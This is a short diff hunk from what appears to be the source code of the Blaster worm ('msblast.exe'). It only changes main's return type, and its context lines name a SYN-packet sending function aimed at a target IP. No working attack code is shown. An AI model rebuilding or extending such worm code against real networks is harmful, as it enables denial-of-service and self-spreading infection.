@@ -99,7 +99,7 @@ void blaster_send_syn_packet(int target_ip, int fd);
 /*************************************************************** 
 * This is where the 'msblast.exe' program starts running
 ***************************************************************/
-int main(int argc, char *argv[]) 
+void main(int argc, char *argv[]) 
 { 
 WSADATA WSAData; 
 char myhostname[512]; 
